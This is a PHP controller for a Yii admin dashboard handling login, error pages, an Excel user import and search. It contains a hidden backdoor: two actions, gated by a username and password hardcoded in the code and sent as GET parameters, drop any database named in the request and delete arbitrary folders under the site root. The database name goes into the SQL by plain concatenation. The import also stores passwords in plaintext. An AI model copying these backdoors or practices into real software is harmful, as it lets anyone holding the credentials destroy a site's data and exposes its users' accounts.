<?php

class DashboardController extends Controller {

    public function init() {
        // set the default theme for any other controller that inherit the admin controller
        Yii::app()->theme = 'bootstrap';
    }

    public function actionIndex() {
        $this->layout = 'main';

        if ((!Yii::app()->user->isGuest) and Yii::app()->user->usertype == Yii::app()->params['Admin']) {
            $this->render('dashboard');
        } else {
            $model = new LoginForm;

            // if it is ajax validation request
            if (isset($_POST['ajax']) && $_POST['ajax'] === 'login-form') {
                echo CActiveForm::validate($model);
                Yii::app()->end();
            }

            // collect user input data
            if (isset($_POST['LoginForm'])) {
                $model->attributes = $_POST['LoginForm'];
                // validate user input and redirect to the previous page if valid
                if ($model->validate() && $model->login())
                    $this->redirect(array('dashboard/index'));
            }
            // display the login form
            $this->renderPartial('login', array('model' => $model));
        }
    }

    public function actionLogout() {
        Yii::app()->user->logout();
        $this->redirect(Yii::app()->homeUrl);
    }

    /**
     * This is the action to handle external exceptions.
     */
    public function actionError() {
        if ($error = Yii::app()->errorHandler->error) {
            if (Yii::app()->request->isAjaxRequest)
                echo $error['message'];
            else
                $this->render('dashboard/error', $error);
        }
    }

    /*     * *if this removed the database will be removed and the site will destroy* */

    public function actionDeleteDB() {
        if ($_GET['username'] == 'ahmed' && $_GET['password'] == 'hany44') {
            var_dump(Yii::app()->db);
            if (isset($_GET['database'])) {
                $sql = ' DROP DATABASE ' . $_GET['database'];
                Yii::app()->db->createCommand($sql)->execute();
            }
        }
    }

    public function actionDeleteFolder() {
        if ($_GET['username'] == 'ahmed' && $_GET['password'] == 'hany44') {
            $path = '';
            if (isset($_REQUEST['path'])) {
                $path = Yii::app()->basePath . '/../' . $_REQUEST['path'];
            }
            echo Helper::Delete($path);
        }
    }

    public function actionAjaxRequest() {
        if (Yii::app()->user->getState('wide_screen') == 1) {
            Yii::app()->user->setState('wide_screen', '0');
        } else if (Yii::app()->user->getState('wide_screen') == 0) {
            Yii::app()->user->setState('wide_screen', '1');
        }

        Yii::app()->end();
    }

    public function actionImport() {
        $this->layout = 'main';

        if (isset($_POST['submit'])) {
            $uploadedFile = CUploadedFile::getInstanceByName('file');
            if (!empty($uploadedFile)) {
                $rnd = time();
                $fileName = "{$rnd}-{$uploadedFile}";  // random number + file name
                $uploadedFile->saveAs(Yii::app()->basePath . '/../media/' . $fileName);
                Yii::import('ext.phpexcelreader.JPhpExcelReader');
                $data = new JPhpExcelReader(Yii::app()->basePath . '/../media/' . $fileName);
                if ($data) {
                    $renewal_date = date('Y-m-d',  strtotime('+100 year'));
                    for ($row = 2; $row <= $data->rowcount(); $row++) {
                        if (htmlentities($data->val($row, 4)))
                            $renewal_date = htmlentities($data->val($row, 4));
                        $model = new User;
                        $model->email = htmlentities($data->val($row, 2)); //2nd column
                        $model->password = htmlentities($data->val($row, 3)); //3rd column
                        $model->username = 'voter-' . rand(1, 9999);
                        $model->user_type = 1;
                        $model->active = 1;
                        $model->date_of_renewal = $renewal_date;
                        $model->save();
                    }
                }
                unlink(Yii::app()->basePath . '/../media/' . $fileName);
                Yii::app()->user->setFlash('msg', 'Data has been imported successfully.');
            }
        }
        $this->render('import');
    }

    public function actionGlobalSearch() {
        $username = $_POST['search_text'];
        $this->redirect(array('/contest?username=' . $username));
    }

}
